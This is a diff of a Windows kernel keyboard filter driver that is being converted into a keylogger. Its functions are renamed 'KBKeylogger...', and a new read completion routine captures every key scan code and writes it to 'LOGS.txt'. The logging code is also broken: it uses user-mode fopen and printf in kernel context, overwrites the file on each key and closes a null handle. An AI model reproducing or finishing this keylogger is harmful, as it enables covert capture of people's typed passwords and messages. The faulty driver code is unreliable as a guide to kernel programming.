@@ -7,13 +7,14 @@ NTSTATUS DriverEntry (PDRIVER_OBJECT, PUNICODE_STRING);
 #ifdef ALLOC_PRAGMA
 #pragma alloc_text (INIT, DriverEntry)
 #pragma alloc_text (PAGE, AddDevice)
-#pragma alloc_text (PAGE, CreateClose)
+#pragma alloc_text (PAGE, KBKeyloggerRead)
+#pragma alloc_text (PAGE, KBKeyloggerCreateClose)
 #pragma alloc_text (PAGE, IoCtl)
-#pragma alloc_text (PAGE, InternIoCtl)
+#pragma alloc_text (PAGE, KBKeyloggerInternIoCtl)
 #pragma alloc_text (PAGE, Unload)
-#pragma alloc_text (PAGE, DispatchPassThrough)
-#pragma alloc_text (PAGE, PnP)
-#pragma alloc_text (PAGE, Power)
+#pragma alloc_text (PAGE, KBKeyloggerDispatchPassThrough)
+#pragma alloc_text (PAGE, KBKeyloggerPnP)
+#pragma alloc_text (PAGE, KBKeyloggerPower)
 #endif
 
 NTSTATUS
@@ -23,28 +24,22 @@ DriverEntry (
     )
 
 {
+	__debugbreak();
 	DbgPrint("DriverEntry");
     ULONG i;
-
     UNREFERENCED_PARAMETER (RegistryPath);
 
     for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
-        DriverObject->MajorFunction[i] = DispatchPassThrough;
+        DriverObject->MajorFunction[i] = KBKeyloggerDispatchPassThrough;
     }
 
-	DriverObject->MajorFunction[IRP_MJ_READ] = ReadCompletion;
+	DriverObject->MajorFunction[IRP_MJ_READ] = KBKeyloggerRead;
     DriverObject->MajorFunction [IRP_MJ_CREATE] =
-    DriverObject->MajorFunction [IRP_MJ_CLOSE] =        CreateClose;
-    DriverObject->MajorFunction [IRP_MJ_PNP] =          PnP;
-    DriverObject->MajorFunction [IRP_MJ_POWER] =        Power;
+    DriverObject->MajorFunction [IRP_MJ_CLOSE] =        KBKeyloggerCreateClose;
+    DriverObject->MajorFunction [IRP_MJ_PNP] =          KBKeyloggerPnP;
+    DriverObject->MajorFunction [IRP_MJ_POWER] =        KBKeyloggerPower;
     DriverObject->MajorFunction [IRP_MJ_INTERNAL_DEVICE_CONTROL] =
-                                                        InternIoCtl;
-    //
-    // If you are planning on using this function, you must create another
-    // device object to send the requests to.  Please see the considerations 
-    // comments for KbFilter_DispatchPassThrough for implementation details.
-    //
-    // DriverObject->MajorFunction [IRP_MJ_DEVICE_CONTROL] = KbFilter_IoCtl;
+                                                        KBKeyloggerInternIoCtl;
 
     DriverObject->DriverUnload = Unload;
     DriverObject->DriverExtension->AddDevice = AddDevice;
@@ -66,7 +61,7 @@ AddDevice(
 
     PAGED_CODE();
 
-    status = IoCreateDevice(Driver,                   
+    status = IoCreateDevice(Driver,         
                             sizeof(DEVICE_EXTENSION), 
                             NULL,                    
                             FILE_DEVICE_KEYBOARD,   
@@ -107,58 +102,14 @@ AddDevice(
 }
 
 
-NTSTATUS
-ReadCompletion(
-    IN PDEVICE_OBJECT   DeviceObject,
-    IN PIRP             Irp
-    )
+
+
+NTSTATUS ReadCompletion(
+	IN PDEVICE_OBJECT DeviceObject,
+	IN PIRP Irp,
+	IN PVOID Context
+	)
 {
-	DbgPrint("ReadCompletion");
-    	
-	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);
-
-	// необрабатываемые запросы на наш управл¤ющий девайс(MJ_CREATE..) завершаем с успехом
-	if (IrpSp->DeviceObject == g_pControlDeviceObject)
-	{
-		Irp->IoStatus.Information = 0;
-		Irp->IoStatus.Status = STATUS_SUCCESS;
-		IoCompleteRequest(Irp, IO_NO_INCREMENT);
-
-		return STATUS_SUCCESS;
-	}
-
-	if (!g_bUnload)
-	{
-		switch (IrpSp->MajorFunction)
-		{
-		case IRP_MJ_READ:
-			// чтоб драйвер не выгрузилс¤ до конца CompletionRoutine
-			ObReferenceObject(DeviceObject);
-			InterlockedIncrement((PLONG)&gSysEnters);
-
-			IoCopyCurrentIrpStackLocationToNext(Irp);
-			IoSetCompletionRoutine(Irp, Completion, NULL, TRUE, TRUE, TRUE);
-
-			break;
-		default:
-			IoSkipCurrentIrpStackLocation(Irp);
-		}
-	}
-	else
-	{
-		IoSkipCurrentIrpStackLocation(Irp);
-	}
-	return DispatchPassThrough(DeviceObject, Irp);
-
-}
-
-Completion(
-	IN PDEVICE_OBJECT   DeviceObject,
-	IN PIRP             Irp,
-	IN PVOID            Context
-)
-{
-	DbgPrint("Complete");
 	PKEYBOARD_INPUT_DATA KeyData;
 	ULONG KeyCount;
 	ULONG i;
@@ -170,19 +121,13 @@ Completion(
 
 		for (i = 0; i < KeyCount; i++)
 		{
-			DbgPrint("kd4.sys: key SCANCODE:%d ", KeyData[i].MakeCode);
+			FILE *file;
 
-			if (KeyData[i].Flags == KEY_MAKE)
-				DbgPrint("pressed");
-
-			if (KeyData[i].Flags & KEY_BREAK)
-				DbgPrint("released");
-			if (KeyData[i].Flags & KEY_E0)
-				DbgPrint(" E0 flag");
-			if (KeyData[i].Flags & KEY_E1)
-				DbgPrint(" E1 flag");
-
-			DbgPrint("\n");
+			if ((file = fopen("LOGS.txt", "w")) == NULL)
+				printf("Can not open file!\n");
+			else 
+				fwrite(&KeyData[i].MakeCode, sizeof(int), 1, file);
+			fclose(file);
 		}
 	}
 
@@ -194,6 +139,24 @@ Completion(
 
 	return STATUS_SUCCESS;
 }
+
+NTSTATUS
+KBKeyloggerRead(
+    IN PDEVICE_OBJECT   DeviceObject,
+    IN PIRP             Irp
+    )
+{
+		ObReferenceObject(DeviceObject);
+		InterlockedIncrement((PLONG)&gSysEnters);
+
+		IoCopyCurrentIrpStackLocationToNext(Irp);
+		IoSetCompletionRoutine(Irp, ReadCompletion, NULL, TRUE, TRUE, TRUE);	
+	
+	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->TopOfStack, Irp);
+
+}
+
+
 
 NTSTATUS
 Complete(
@@ -212,7 +175,7 @@ Complete(
 }
 
 NTSTATUS
-CreateClose (
+KBKeyloggerCreateClose (
     IN  PDEVICE_OBJECT  DeviceObject,
     IN  PIRP            Irp
     )
@@ -238,7 +201,7 @@ CreateClose (
             //
             status = STATUS_INVALID_DEVICE_STATE;
         }
-        else if ( 1 == InterlockedIncrement(&devExt->EnableCount)) {
+        else if ( 1 == InterlockedIncrement64(&devExt->EnableCount)) {
             //
             // first time enable here
             //
@@ -267,23 +230,23 @@ CreateClose (
     //
     // Pass on the create and the close
     //
-    return DispatchPassThrough(DeviceObject, Irp);
+    return KBKeyloggerDispatchPassThrough(DeviceObject, Irp);
 }
 
 NTSTATUS
-DispatchPassThrough(
+KBKeyloggerDispatchPassThrough(
         IN PDEVICE_OBJECT DeviceObject,
         IN PIRP Irp
         )
-{
+{	
 	DbgPrint("Disptch");
-    PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
-    IoSkipCurrentIrpStackLocation(Irp);        
-    return IoCallDriver(((PDEVICE_EXTENSION) DeviceObject->DeviceExtension)->TopOfStack, Irp);
+	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);
+	IoSkipCurrentIrpStackLocation(Irp);
+	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->TopOfStack, Irp);
 }           
 
 NTSTATUS
-InternIoCtl(
+KBKeyloggerInternIoCtl(
     IN PDEVICE_OBJECT DeviceObject,
     IN PIRP Irp
     )
@@ -336,7 +299,6 @@ InternIoCtl(
         //
         connectData->ClassDeviceObject = devExt->Self;
         connectData->ClassService = ServiceCallback;
-
         break;
 
     //
@@ -428,11 +390,11 @@ InternIoCtl(
         return status;
     }
 
-    return DispatchPassThrough(DeviceObject, Irp);
+    return KBKeyloggerDispatchPassThrough(DeviceObject, Irp);
 }
 
 NTSTATUS
-PnP(
+KBKeyloggerPnP(
     IN PDEVICE_OBJECT DeviceObject,
     IN PIRP Irp
     )
@@ -452,13 +414,6 @@ PnP(
 
     switch (irpStack->MinorFunction) {
     case IRP_MN_START_DEVICE: {
-
-        //
-        // The device is starting.
-        //
-        // We cannot touch the device (send it any non pnp irps) until a
-        // start device has been passed down to the lower drivers.
-        //
         IoCopyCurrentIrpStackLocationToNext(Irp);
         KeInitializeEvent(&event,
                           NotificationEvent,
@@ -484,19 +439,11 @@ PnP(
         }
 
         if (NT_SUCCESS(status) && NT_SUCCESS(Irp->IoStatus.Status)) {
-            //
-            // As we are successfully now back from our start device
-            // we can do work.
-            //
             devExt->Started = TRUE;
             devExt->Removed = FALSE;
             devExt->SurpriseRemoved = FALSE;
         }
 
-        //
-        // We must now complete the IRP, since we stopped it in the
-        // completetion routine with MORE_PROCESSING_REQUIRED.
-        //
         Irp->IoStatus.Status = status;
         Irp->IoStatus.Information = 0;
         IoCompleteRequest(Irp, IO_NO_INCREMENT);
@@ -505,12 +452,8 @@ PnP(
     }
 
     case IRP_MN_SURPRISE_REMOVAL:
-        //
-        // Same as a remove device, but don't call IoDetach or IoDeleteDevice
-        //
+       
         devExt->SurpriseRemoved = TRUE;
-
-        // Remove code here
 
         IoSkipCurrentIrpStackLocation(Irp);
         status = IoCallDriver(devExt->TopOfStack, Irp);
@@ -519,8 +462,6 @@ PnP(
     case IRP_MN_REMOVE_DEVICE:
         
         devExt->Removed = TRUE;
-
-        // remove code here
         Irp->IoStatus.Status = STATUS_SUCCESS;
         
         IoSkipCurrentIrpStackLocation(Irp);
@@ -550,10 +491,6 @@ PnP(
     case IRP_MN_QUERY_ID:
     case IRP_MN_QUERY_PNP_DEVICE_STATE:
     default:
-        //
-        // Here the filter driver might modify the behavior of these IRPS
-        // Please see PlugPlay documentation for use of these IRPs.
-        //
         IoSkipCurrentIrpStackLocation(Irp);
         status = IoCallDriver(devExt->TopOfStack, Irp);
         break;
@@ -563,7 +500,7 @@ PnP(
 }
 
 NTSTATUS
-Power(
+KBKeyloggerPower(
     IN PDEVICE_OBJECT    DeviceObject,
     IN PIRP              Irp
     )
